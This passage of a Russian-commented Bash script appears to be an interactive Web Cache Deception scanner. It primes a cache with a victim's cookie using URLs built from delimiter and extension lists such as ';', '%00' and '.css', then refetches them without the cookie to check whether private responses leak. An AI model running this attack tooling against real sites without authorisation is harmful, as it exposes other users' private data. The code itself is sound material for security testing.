    if [[ -n "$COOKIE" ]]; then
        # Прогрев с кукой (имитация жертвы)
        echo -e "${CYAN}    Режим: ${GREEN}С КУКОЙ${CYAN} (имитация жертвы)${NC}"
        do_curl "$attack_url" "-s -o /dev/null -b \"$COOKIE\""
        log_event "SHOT" "Прогрев с кукой" "$attack_url"
    else
        # Прогрев без куки
        echo -e "${CYAN}    Режим: ${YELLOW}БЕЗ КУКИ${NC}"
        do_curl "$attack_url" "-s -o /dev/null"
        log_event "SHOT" "Прогрев без куки" "$attack_url"
    fi

    echo -e "${GREEN}    ✓ Запрос отправлен${NC}"
    echo -e "${CYAN}    Жду 2 секунды для сохранения в кэш...${NC}"
    sleep 2

    # ===== ФАЗА 2: ПРОВЕРКА КЭША (БЕЗ КУКИ) =====
    echo ""
    echo -e "${YELLOW}[*] ФАЗА 2: ПРОВЕРКА КЭША${NC}"
    echo -e "${CYAN}    Отправляю запрос ${RED}БЕЗ КУКИ${CYAN} (имитация атакующего)...${NC}"

    # Получаем только заголовки ответа
    local response=$(do_curl "$attack_url" "-s -I")
    local cache_status=$(echo "$response" | grep -i "X-Cache-Status" | head -1 | awk '{print $2}' | tr -d '\r')
    local bypass=$(echo "$response" | grep -i "X-WCD-Bypass" | head -1 | awk '{print $2}' | tr -d '\r')
    local http_code=$(echo "$response" | head -1 | awk '{print $2}' | tr -d '\r\n')

    # ===== ВЫВОД РЕЗУЛЬТАТОВ =====
    echo ""
    echo -e "${WHITE}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${WHITE}│ РЕЗУЛЬТАТ                                                    │${NC}"
    echo -e "${WHITE}├─────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${WHITE}│ URL:      $attack_url${NC}"
    echo -e "${WHITE}│ HTTP:     $http_code${NC}"
    echo -e "${WHITE}│ Cache:    ${cache_status:-НЕТ ЗАГОЛОВКА}${NC}"
    echo -e "${WHITE}│ Bypass:   ${bypass:-нет}${NC}"
    echo -e "${WHITE}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    # ===== АНАЛИЗ РЕЗУЛЬТАТА =====
    if [[ "$cache_status" == "HIT" ]]; then
        # Кэш отдал закэшированный ответ - УЯЗВИМОСТЬ!
        echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║  ⚠️  ПРОБИТИЕ! УЯЗВИМОСТЬ ПОДТВЕРЖДЕНА!                       ║${NC}"
        echo -e "${RED}║  Кэш отдал приватные данные БЕЗ КУКИ!                         ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"
        log_event "VULN" "Обнаружена уязвимость (HIT)" "$attack_url"
    elif [[ "$cache_status" == "BYPASS" ]]; then
        # Защита сработала - кэш обойдён
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  ✅ ЗАЩИТА СРАБОТАЛА                                          ║${NC}"
        echo -e "${GREEN}║  Nginx обошёл кэш, атака отражена.                            ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
        log_event "INFO" "Защита сработала (BYPASS)" "$attack_url"
    elif [[ "$cache_status" == "MISS" ]]; then
        # Кэш пуст - ответ не был закэширован
        echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║  📝 ПРОМАХ КЭША                                               ║${NC}"
        echo -e "${YELLOW}║  Ответ не был закэширован.                                    ║${NC}"
        echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════════╝${NC}"
        log_event "INFO" "Промах кэша (MISS)" "$attack_url"
    else
        # Нет заголовка X-Cache-Status - вероятно, не кэширующий прокси
        echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║  ❓ НЕТ ЗАГОЛОВКА X-Cache-Status                              ║${NC}"
        echo -e "${BLUE}║  Возможно, прокси не настроен или ответ не из кэша.           ║${NC}"
        echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
        log_event "WARN" "Нет заголовка X-Cache-Status" "$attack_url"
    fi
    echo ""
}

# =============================================================================
# БЫСТРЫЙ ОДИНОЧНЫЙ ВЫСТРЕЛ (только проверка, без прогрева)
# =============================================================================
# Выполняет только проверку кэша без фазы прогрева
# Аргументы (опциональные):
#   $1 - разделитель
#   $2 - расширение
quick_shot() {
    local delim="$1"
    local ext="$2"

    # ===== ОБРАБОТКА РАЗДЕЛИТЕЛЯ =====
    if [[ -z "$delim" ]]; then
        if [[ ${#DELIMITERS[@]} -gt 0 ]]; then
            delim="${DELIMITERS[0]}"
            echo -e "${YELLOW}[*] Разделитель не указан, использую первый из обоймы: '$delim'${NC}"
        else
            echo -e "${RED}[!] Обойма разделителей пуста, а разделитель не указан.${NC}"
            log_event "ERROR" "quick_shot: обойма разделителей пуста"
            return 1
        fi
    elif [[ "$delim" == "none" ]]; then
        delim=""
        echo -e "${YELLOW}[*] Разделитель отключен (none)${NC}"
    fi

    # ===== ОБРАБОТКА РАСШИРЕНИЯ =====
    if [[ -z "$ext" ]]; then
        if [[ ${#EXTENSIONS[@]} -gt 0 ]]; then
            ext="${EXTENSIONS[0]}"
            echo -e "${YELLOW}[*] Расширение не указано, использую первое из обоймы: '$ext'${NC}"
        else
            echo -e "${RED}[!] Обойма расширений пуста, а расширение не указано.${NC}"
            log_event "ERROR" "quick_shot: обойма расширений пуста"
            return 1
        fi
    elif [[ "$ext" == "none" ]]; then
        ext=""
        echo -e "${YELLOW}[*] Расширение отключено (none)${NC}"
    fi

    # Добавляем точку к расширению
    if [[ -n "$ext" && "$ext" != .* ]]; then
        ext=".$ext"
    fi

    # Проверяем доступность цели
    if ! check_target; then
        return 1
    fi

    # Формируем URL
    local attack_url
    if [[ -n "$delim" ]]; then
        attack_url="${TARGET}${delim}test${ext}"
    else
        attack_url="${TARGET}test${ext}"
    fi

    echo ""
    echo -e "${CYAN}[*] БЫСТРЫЙ ВЫСТРЕЛ: $attack_url${NC}"

    # Получаем заголовки
    local response=$(do_curl "$attack_url" "-s -I")
    local cache_status=$(echo "$response" | grep -i "X-Cache-Status" | head -1 | awk '{print $2}' | tr -d '\r')
    local http_code=$(echo "$response" | head -1 | awk '{print $2}' | tr -d '\r\n')

    # Выводим результат
    if [[ "$cache_status" == "HIT" ]]; then
        echo -e "${RED}[!] HIT! $attack_url (HTTP $http_code)${NC}"
        log_event "VULN" "Быстрый выстрел: HIT" "$attack_url"
    elif [[ "$cache_status" == "BYPASS" ]]; then
        echo -e "${GREEN}[✓] BYPASS $attack_url (HTTP $http_code)${NC}"
    elif [[ "$cache_status" == "MISS" ]]; then
        echo -e "${YELLOW}[?] MISS $attack_url (HTTP $http_code)${NC}"
    else
        echo -e "${BLUE}[ ] NO_CACHE $attack_url (HTTP $http_code)${NC}"
    fi
    echo ""
}

# =============================================================================
# ПОКАЗАТЬ ОТВЕТ ЦЕЛИКОМ (для отладки)
# =============================================================================
# Показывает полный HTTP-ответ (заголовки + тело) для одного вектора
# Аргументы (опциональные):
#   $1 - разделитель
#   $2 - расширение
show_response() {
    local delim="$1"
    local ext="$2"

    # ===== ОБРАБОТКА РАЗДЕЛИТЕЛЯ =====
    if [[ -z "$delim" ]]; then
        if [[ ${#DELIMITERS[@]} -gt 0 ]]; then
            delim="${DELIMITERS[0]}"
            echo -e "${YELLOW}[*] Разделитель не указан, использую первый из обоймы: '$delim'${NC}"
        else
            echo -e "${RED}[!] Обойма разделителей пуста, а разделитель не указан.${NC}"
            log_event "ERROR" "show_response: обойма разделителей пуста"
            return 1
        fi
    elif [[ "$delim" == "none" ]]; then
        delim=""
        echo -e "${YELLOW}[*] Разделитель отключен (none)${NC}"
    fi

    # ===== ОБРАБОТКА РАСШИРЕНИЯ =====
    if [[ -z "$ext" ]]; then
        if [[ ${#EXTENSIONS[@]} -gt 0 ]]; then
            ext="${EXTENSIONS[0]}"
            echo -e "${YELLOW}[*] Расширение не указано, использую первое из обоймы: '$ext'${NC}"
        else
            echo -e "${RED}[!] Обойма расширений пуста, а расширение не указано.${NC}"
            log_event "ERROR" "show_response: обойма расширений пуста"
            return 1
        fi
    elif [[ "$ext" == "none" ]]; then
        ext=""
        echo -e "${YELLOW}[*] Расширение отключено (none)${NC}"
    fi

    # Добавляем точку к расширению
    if [[ -n "$ext" && "$ext" != .* ]]; then
        ext=".$ext"
    fi

    # Формируем URL
    local attack_url
    if [[ -n "$delim" ]]; then
        attack_url="${TARGET}${delim}test${ext}"
    else
        attack_url="${TARGET}test${ext}"
    fi

    echo ""
    echo -e "${CYAN}[*] ЗАПРОС К: $attack_url${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"

    # Показываем полный ответ
    if [[ -n "$COOKIE" ]]; then
        echo -e "${YELLOW}[*] С кукой: $COOKIE${NC}"
        do_curl "$attack_url" "-i -b \"$COOKIE\""
    else
        echo -e "${YELLOW}[*] Без куки${NC}"
        do_curl "$attack_url" "-i"
    fi

    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    log_event "INFO" "Показан полный ответ" "$attack_url"
}

# =============================================================================
# ДВУХФАЗНЫЙ ОБСТРЕЛ
# =============================================================================
# Выполняет полный обстрел по всем комбинациям DELIMITERS × EXTENSIONS
fire() {
    # Проверяем доступность цели
    if ! check_target; then
        return 1
    fi
    
    local cookie_status=""
    local use_cookie=false
    
    # ===== ПРОВЕРКА КУКИ =====
    if [[ -n "$COOKIE" ]]; then
        echo ""
        echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${CYAN}│ ПРОВЕРКА ПАРАМЕТРОВ ПЕРЕД ОБСТРЕЛОМ                         │${NC}"
        echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
        
        if validate_cookie; then
            cookie_status="ВАЛИДНАЯ КУКА"
            use_cookie=true
        else
            # Кука невалидна - спрашиваем, использовать ли принудительно
            echo -e "${YELLOW}[?] Кука не прошла проверку. Использовать всё равно? (y/n)${NC}"
            read -p "> " choice
            if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
                cookie_status="НЕВАЛИДНАЯ КУКА (использую принудительно)"
                use_cookie=true
            else
                cookie_status="БЕЗ КУКИ"
                use_cookie=false
                COOKIE=""
            fi
        fi
    else
        cookie_status="БЕЗ КУКИ"
        use_cookie=false
    fi

    # Общее количество тестируемых векторов
    local total_tests=$((${#DELIMITERS[@]} * ${#EXTENSIONS[@]}))
    local current=0
    local hits=0
    local bypasses=0
    local misses=0
    local errors=0

    log_event "FIRE" "Начало обстрела" "Всего векторов: $total_tests, кука: $use_cookie, прокси: $USE_PROXY"

    # ===== ФАЗА 1: ПРОГРЕВ =====
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  🔥 ФАЗА 1: ПРОГРЕВ КЭША                                      ║${NC}"
    echo -e "${MAGENTA}║  Имитация действий ЖЕРТВЫ — запись ответов в кэш              ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ РЕЖИМ ПРОГРЕВА: ${WHITE}$cookie_status${NC}"
    echo -e "${CYAN}├─────────────────────────────────────────────────────────────┤${NC}"
    if [[ "$use_cookie" == true ]]; then
        echo -e "${CYAN}│ Запросы отправляются ${GREEN}С КУКОЙ${CYAN} (имитация жертвы)             │${NC}"
    else
        echo -e "${CYAN}│ Запросы отправляются ${YELLOW}БЕЗ КУКИ${CYAN} (кука не задана)           │${NC}"
    fi
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "${CYAN}│ Трафик идёт через ${MAGENTA}Burp Suite (${BURP_HOST}:${BURP_PORT})${CYAN}            │${NC}"
    fi
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    # Перебираем все комбинации разделителей и расширений
    for delim in "${DELIMITERS[@]}"; do
        for ext in "${EXTENSIONS[@]}"; do
            ((current++))
            local attack_url="${TARGET}${delim}test${ext}"
            
            printf "  [%3d/%3d] ПРОГРЕВ: %s" $current $total_tests "$attack_url"
            
            if [[ "$use_cookie" == true ]]; then
                do_curl "$attack_url" "-s -o /dev/null -b \"$COOKIE\""
                echo -e " ${GREEN}✓ (с кукой)${NC}"
            else
                do_curl "$attack_url" "-s -o /dev/null"
                echo -e " ${YELLOW}✓ (без куки)${NC}"
            fi
            sleep 0.2
        done
    done

    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ ФАЗА 1 ЗАВЕРШЕНА. Всего отправлено запросов: $total_tests${NC}"
    echo -e "${CYAN}│ Жду 2 секунды для сохранения кэша...                         │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    sleep 2

    # ===== ФАЗА 2: ПРОВЕРКА =====
    current=0
    echo ""
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  🔍 ФАЗА 2: ПРОВЕРКА КЭША                                     ║${NC}"
    echo -e "${MAGENTA}║  Имитация действий АТАКУЮЩЕГО — попытка украсть кэш           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│ РЕЖИМ ПРОВЕРКИ: ${RED}ВСЕГДА БЕЗ КУКИ${CYAN} (имитация атакующего)    │${NC}"
    echo -e "${CYAN}├─────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}│ ${RED}HIT${CYAN} — кэш отдал данные (УЯЗВИМОСТЬ)  ${GREEN}BYPASS${CYAN} — защита       │${NC}"
    echo -e "${CYAN}│ ${YELLOW}MISS${CYAN} — кэш пуст                     ${BLUE}NO_CACHE${CYAN} — нет заголовка│${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    # Перебираем все комбинации для проверки
    for delim in "${DELIMITERS[@]}"; do
        for ext in "${EXTENSIONS[@]}"; do
            ((current++))
            local attack_url="${TARGET}${delim}test${ext}"
            
            local response=$(do_curl "$attack_url" "-s -I")
            local cache_status=$(echo "$response" | grep -i "X-Cache-Status" | head -1 | awk '{print $2}' | tr -d '\r')
            local bypass=$(echo "$response" | grep -i "X-WCD-Bypass" | head -1 | awk '{print $2}' | tr -d '\r')
            local http_code=$(echo "$response" | head -1 | awk '{print $2}' | tr -d '\r\n')
            
            printf "[%3d/%3d] " $current $total_tests
            
            if [[ "$cache_status" == "HIT" ]]; then
                echo -e "${RED}[!] ПРОБИТИЕ!${NC} $attack_url"
                echo -e "         → HTTP $http_code, Cache: ${RED}$cache_status${NC}"
                log_event "VULN" "Обнаружена уязвимость при обстреле" "$attack_url (Cache: HIT)"
                ((hits++))
            elif [[ "$cache_status" == "BYPASS" ]]; then
                echo -e "${GREEN}[✓] ЗАЩИТА${NC}   $attack_url"
                ((bypasses++))
            elif [[ "$cache_status" == "MISS" ]]; then
                echo -e "${YELLOW}[?] MISS${NC}     $attack_url"
                ((misses++))
            else
                echo -e "${BLUE}[ ] NO_CACHE${NC} $attack_url"
                ((errors++))
            fi
            sleep 0.1
        done
    done

    # ===== ИТОГИ =====
    echo ""
    echo -e "${WHITE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║  📊 ИТОГИ ОБСТРЕЛА                                             ║${NC}"
    echo -e "${WHITE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "  ${CYAN}Всего векторов:${NC} $total_tests"
    echo -e "  ${RED}🔴 HIT:${NC} $hits  ${GREEN}🟢 BYPASS:${NC} $bypasses  ${YELLOW}🟡 MISS:${NC} $misses  ${BLUE}🔵 ERR:${NC} $errors"
    echo ""
    
    if [[ $hits -gt 0 ]]; then
        echo -e "${RED}⚠️  ВЕРДИКТ: ОБНАРУЖЕНА УЯЗВИМОСТЬ Web Cache Deception!${NC}"
        log_event "VULN" "Итоговый вердикт: уязвимость обнаружена" "HIT=$hits, BYPASS=$bypasses, MISS=$misses, ERR=$errors"
    else
        echo -e "${GREEN}✅ ВЕРДИКТ: УЯЗВИМОСТЬ НЕ ОБНАРУЖЕНА${NC}"
        log_event "INFO" "Итоговый вердикт: уязвимость не обнаружена" "HIT=$hits, BYPASS=$bypasses, MISS=$misses, ERR=$errors"
    fi
    echo -e "${WHITE}═══════════════════════════════════════════════════════════════${NC}"
}

# =============================================================================
# УПРАВЛЕНИЕ РАЗДЕЛИТЕЛЯМИ
# =============================================================================

# Добавляет один разделитель в текущую обойму
add_delimiter() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи разделитель${NC}"
        log_event "ERROR" "add_delimiter: не указан разделитель"
        return 1
    fi
    DELIMITERS+=("$1")
    echo -e "${GREEN}[+] Разделитель добавлен: $1${NC}"
    log_event "INFO" "Добавлен разделитель" "$1"
}

# Добавляет несколько разделителей через пробел
add_delimiters_batch() {
    echo -e "${CYAN}[*] Введи разделители через пробел:${NC}"
    read -p "> " -a new_delimiters
    
    if [[ ${#new_delimiters[@]} -eq 0 ]]; then
        echo -e "${RED}[!] Не введено ни одного разделителя${NC}"
        log_event "ERROR" "add_delimiters_batch: пустой ввод"
        return 1
    fi
    
    for d in "${new_delimiters[@]}"; do
        DELIMITERS+=("$d")
    done
    
    echo -e "${GREEN}[+] Добавлено ${#new_delimiters[@]} разделителей${NC}"
    log_event "INFO" "Пакетное добавление разделителей" "Количество: ${#new_delimiters[@]}"
    show_delimiters
}

# Удаляет разделитель по значению
remove_delimiter() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи разделитель для удаления${NC}"
        log_event "ERROR" "remove_delimiter: не указан разделитель"
        return 1
    fi
    local new_array=()
    local found=0
    for d in "${DELIMITERS[@]}"; do
        if [[ "$d" != "$1" ]]; then
            new_array+=("$d")
        else
            found=1
        fi
    done
    DELIMITERS=("${new_array[@]}")
    if [[ $found -eq 1 ]]; then
        echo -e "${YELLOW}[-] Разделитель удалён: $1${NC}"
        log_event "INFO" "Удалён разделитель" "$1"
    else
        echo -e "${RED}[!] Разделитель не найден: $1${NC}"
        log_event "ERROR" "remove_delimiter: разделитель не найден" "$1"
    fi
}

# Очищает обойму разделителей
clear_delimiters() {
    DELIMITERS=()
    echo -e "${YELLOW}[-] Обойма разделителей очищена${NC}"
    log_event "INFO" "Обойма разделителей очищена"
}

# Сбрасывает обойму разделителей к стандартному набору
reset_delimiters() {
    DELIMITERS=(";" "." "?" "%00" "%23" "%3F" "%0A" "%09" "%20")
    echo -e "${GREEN}[+] Обойма разделителей сброшена к стандартной${NC}"
    log_event "INFO" "Обойма разделителей сброшена к стандартной" "${#DELIMITERS[@]} разделителей"
    show_delimiters
}

# Показывает текущие разделители
show_delimiters() {
    echo ""
    echo -e "${CYAN}Текущие разделители (${#DELIMITERS[@]}):${NC}"
    if [[ ${#DELIMITERS[@]} -eq 0 ]]; then
        echo -e "${YELLOW}  (пусто)${NC}"
    else
        local i=1
        for d in "${DELIMITERS[@]}"; do
            echo "  $i) $d"
            ((i++))
        done
    fi
    echo ""
}

# =============================================================================
# УПРАВЛЕНИЕ РАСШИРЕНИЯМИ
# =============================================================================

# Добавляет одно расширение в текущую обойму
add_extension() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи расширение${NC}"
        log_event "ERROR" "add_extension: не указано расширение"
        return 1
    fi
    local ext="$1"
    # Автоматически добавляем точку, если её нет
    [[ "$ext" != .* ]] && ext=".$ext"
    EXTENSIONS+=("$ext")
    echo -e "${GREEN}[+] Расширение добавлено: $ext${NC}"
    log_event "INFO" "Добавлено расширение" "$ext"
}

# Добавляет несколько расширений через пробел
add_extensions_batch() {
    echo -e "${CYAN}[*] Введи расширения через пробел:${NC}"
    read -p "> " -a new_extensions
    
    if [[ ${#new_extensions[@]} -eq 0 ]]; then
        echo -e "${RED}[!] Не введено ни одного расширения${NC}"
        log_event "ERROR" "add_extensions_batch: пустой ввод"
        return 1
    fi
    
    for e in "${new_extensions[@]}"; do
        local ext="$e"
        [[ "$ext" != .* ]] && ext=".$ext"
        EXTENSIONS+=("$ext")
    done
    
    echo -e "${GREEN}[+] Добавлено ${#new_extensions[@]} расширений${NC}"
    log_event "INFO" "Пакетное добавление расширений" "Количество: ${#new_extensions[@]}"
    show_extensions
}

# Удаляет расширение по значению
remove_extension() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи расширение для удаления${NC}"
        log_event "ERROR" "remove_extension: не указано расширение"
        return 1
    fi
    local ext="$1"
    [[ "$ext" != .* ]] && ext=".$ext"
    
    local new_array=()
    local found=0
    for e in "${EXTENSIONS[@]}"; do
        if [[ "$e" != "$ext" ]]; then
            new_array+=("$e")
        else
            found=1
        fi
    done
    EXTENSIONS=("${new_array[@]}")
    if [[ $found -eq 1 ]]; then
        echo -e "${YELLOW}[-] Расширение удалено: $ext${NC}"
        log_event "INFO" "Удалено расширение" "$ext"
    else
        echo -e "${RED}[!] Расширение не найдено: $ext${NC}"
        log_event "ERROR" "remove_extension: расширение не найдено" "$ext"
    fi
}

# Очищает обойму расширений
clear_extensions() {
    EXTENSIONS=()
    echo -e "${YELLOW}[-] Обойма расширений очищена${NC}"
    log_event "INFO" "Обойма расширений очищена"
}

# Сбрасывает обойму расширений к стандартному набору
reset_extensions() {
    EXTENSIONS=(".css" ".js" ".jpg" ".ico")
    echo -e "${GREEN}[+] Обойма расширений сброшена к стандартной${NC}"
    log_event "INFO" "Обойма расширений сброшена к стандартной" "${#EXTENSIONS[@]} расширений"
    show_extensions
}

# Показывает текущие расширения
show_extensions() {
    echo ""
    echo -e "${CYAN}Текущие расширения (${#EXTENSIONS[@]}):${NC}"
    if [[ ${#EXTENSIONS[@]} -eq 0 ]]; then
        echo -e "${YELLOW}  (пусто)${NC}"
    else
        for e in "${EXTENSIONS[@]}"; do
            echo "  - $e"
        done
    fi
    echo ""
}

# =============================================================================
# ПРОЧИЕ ФУНКЦИИ
# =============================================================================

# Устанавливает целевой URL
set_target() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи URL цели${NC}"
        log_event "ERROR" "set_target: URL не указан"
        return 1
    fi
    TARGET="$1"
    echo -e "${GREEN}[+] Цель установлена: $TARGET${NC}"
    log_event "INFO" "Установлена цель" "$TARGET"
    check_target
}

# Устанавливает куку аутентификации
set_cookie() {
    COOKIE="$1"
    if [[ -z "$COOKIE" ]]; then
        echo -e "${YELLOW}[*] Кука очищена${NC}"
        log_event "INFO" "Кука очищена"
    else
        echo -e "${GREEN}[+] Кука установлена: $COOKIE${NC}"
        log_event "INFO" "Установлена кука" "$COOKIE"
        validate_cookie
    fi
}

# Управляет проксированием (on/off)
set_proxy() {
    if [[ "$1" == "on" || "$1" == "enable" ]]; then
        if check_burp; then
            USE_PROXY=true
            PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
            echo -e "${GREEN}[+] Проксирование ВКЛЮЧЕНО${NC}"
            log_event "INFO" "Проксирование включено" "${BURP_HOST}:${BURP_PORT}"
        else
            echo -e "${RED}[!] Burp Suite недоступен${NC}"
            log_event "ERROR" "Не удалось включить прокси: Burp недоступен"
        fi
    elif [[ "$1" == "off" || "$1" == "disable" ]]; then
        USE_PROXY=false
        PROXY_STRING=""
        echo -e "${YELLOW}[*] Проксирование ОТКЛЮЧЕНО${NC}"
        log_event "INFO" "Проксирование отключено"
    else
        echo -e "${YELLOW}[*] Используй: proxy on|off${NC}"
    fi
}

# Показывает текущую цель
show_target() {
    echo -e "${CYAN}Текущая цель:${NC} ${TARGET:-НЕ ЗАДАНА}"
    [[ -n "$TARGET" ]] && check_target
}

# Показывает текущую куку
show_cookie() {
    if [[ -n "$COOKIE" ]]; then
        echo -e "${CYAN}Текущая кука:${NC} $COOKIE"
        validate_cookie
    else
        echo -e "${CYAN}Текущая кука:${NC} ${YELLOW}НЕ ЗАДАНА${NC}"
    fi
}

# Показывает статус прокси
show_proxy() {
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "${CYAN}Прокси:${NC} ${GREEN}ВКЛЮЧЕН${NC} (${BURP_HOST}:${BURP_PORT})"
    else
        echo -e "${CYAN}Прокси:${NC} ${YELLOW}ОТКЛЮЧЕН${NC}"
    fi
}

# Показывает все сохранённые обоймы
show_magazines() {
    echo ""
    list_delimiters_magazines
    list_extensions_magazines
}

# Показывает справку по командам
show_help() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}📖 КОМАНДЫ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${WHITE}🎯 ЦЕЛЬ И КУКА:${NC}"
    echo "  set target <URL>      — установить цель"
    echo "  set cookie <COOKIE>   — установить куку"
    echo "  target                — показать цель"
    echo "  cookie                — показать куку"
    echo ""
    echo -e "${WHITE}🔌 ПРОКСИ:${NC}"
    echo "  proxy on|off          — вкл/выкл прокси (Burp)"
    echo ""
    echo -e "${WHITE}🔫 ОДИНОЧНЫЕ ВЫСТРЕЛЫ:${NC}"
    echo "  single [D] [E]        — полный цикл (прогрев + проверка)"
    echo "  quick [D] [E]         — быстрая проверка (без прогрева)"
    echo "  show [D] [E]          — показать полный ответ"
    echo "  Если D или E не указаны, берётся первый элемент из обоймы."
    echo "  Используй 'none' чтобы отключить разделитель или расширение."
    echo "  Примеры:"
    echo "    single ; .css       — явно указаны оба"
    echo "    single ;            — разделитель ';', расширение из обоймы"
    echo "    single .css         — расширение '.css', разделитель из обоймы"
    echo "    single              — разделитель и расширение из обойм"
    echo "    single none .css    — без разделителя, только расширение"
    echo ""
    echo -e "${WHITE}🌐 ПРЯМОЙ ЗАПРОС:${NC}"
    echo "  raw <URL>             — выполнить прямой curl-запрос к указанному URL"
    echo "                          (автоматически использует прокси, если включен)"
    echo "  Примеры:"
    echo "    raw http://127.0.0.1:8080/profile"
    echo "    raw http://127.0.0.1:8080/profile;test.css"
    echo "    raw http://127.0.0.1:8080/login"
    echo ""
    echo -e "${WHITE}📦 РАЗДЕЛИТЕЛИ:${NC}"
    echo "  add <CHAR>            — добавить разделитель"
    echo "  addmany               — добавить несколько"
    echo "  remove <CHAR>         — удалить разделитель"
    echo "  delimiters            — показать разделители"
    echo "  clear_delimiters      — очистить"
    echo "  reset_delimiters      — сбросить"
    echo ""
    echo -e "${WHITE}📦 РАСШИРЕНИЯ:${NC}"
    echo "  addext <EXT>          — добавить расширение"
    echo "  addextmany            — добавить несколько"
    echo "  remext <EXT>          — удалить расширение"
    echo "  extensions            — показать расширения"
    echo "  clear_extensions      — очистить"
    echo "  reset_extensions      — сбросить"
    echo ""
    echo -e "${WHITE}💾 ОБОЙМЫ:${NC}"
    echo "  load <name>           — загрузить обойму (разделители + расширения)"
    echo "  save_d <name>         — сохранить разделители"
    echo "  load_d <name>         — загрузить разделители"
    echo "  list_d                — список обойм разделителей"
    echo "  delete_d <name>       — удалить обойму разделителей"
    echo "  save_e <name>         — сохранить расширения"
    echo "  load_e <name>         — загрузить расширения"
    echo "  list_e                — список обойм расширений"
    echo "  delete_e <name>       — удалить обойму расширений"
    echo "  magazines             — показать все обоймы"
    echo ""
    echo -e "${WHITE}🔥 АТАКА:${NC}"
    echo "  fire                  — ДВУХФАЗНЫЙ ОБСТРЕЛ ВСЕМИ"
    echo ""
    echo "  check [URL]           — проверить доступность"
    echo "  clear                 — очистить экран"
    echo "  help                  — это сообщение"
    echo "  exit                  — выход"
    echo ""
    echo -e "${CYAN}📁 Обоймы: ${WHITE}$MAGAZINE_DIR${NC}"
    echo -e "${CYAN}📋 Лог: ${WHITE}$LOG_FILE${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
}

# =============================================================================
# ГЛАВНЫЙ ЦИКЛ
# =============================================================================
main() {
    # Инициализация директории для лога
    mkdir -p "$PROJECT_TOOLS_DIR" 2>/dev/null
    
    # Логируем старт сессии
    log_event "START" "=== НОВАЯ СЕССИЯ WCD GUN v7.8 ==="
    log_event "INFO" "Исходная директория проекта" "$PROJECT_TOOLS_DIR"
    log_event "INFO" "Лог-файл" "$LOG_FILE"
    log_event "INFO" "Директория обойм" "$MAGAZINE_DIR"
    
    # Инициализация директории для обойм
    init_magazine_dir
    
    # Если передан аргумент - используем его как цель
    [[ -n "$1" ]] && TARGET="$1"
    
    # Показываем баннер
    banner
    
    # Настраиваем прокси (запрашиваем у пользователя)
    setup_proxy
    
    # Если цель не задана - запрашиваем
    if [[ -z "$TARGET" ]]; then
        echo ""
        read -p "🎯 Цель: " TARGET
        log_event "INFO" "Цель введена" "$TARGET"
    fi
    
    # Проверяем доступность цели
    [[ -n "$TARGET" ]] && check_target
    
    # Если кука не задана - запрашиваем
    if [[ -z "$COOKIE" ]]; then
        echo ""
        read -p "🍪 Кука (Enter чтобы пропустить): " COOKIE
        if [[ -n "$COOKIE" ]]; then
            log_event "INFO" "Кука введена" "$COOKIE"
        fi
    fi
    
    # Проверяем валидность куки
    [[ -n "$COOKIE" ]] && validate_cookie
    
    # Показываем баннер с обновлённой информацией
    banner
    
    # Выводим текущие настройки
    echo -e "${GREEN}[+] Цель: ${WHITE}$TARGET${NC}"
    echo -e "${GREEN}[+] Кука: ${WHITE}${COOKIE:-НЕТ}${NC}"
    echo -e "${GREEN}[+] Прокси: ${WHITE}$([[ "$USE_PROXY" == true ]] && echo "Burp ${BURP_HOST}:${BURP_PORT}" || echo "ОТКЛЮЧЕН")${NC}"
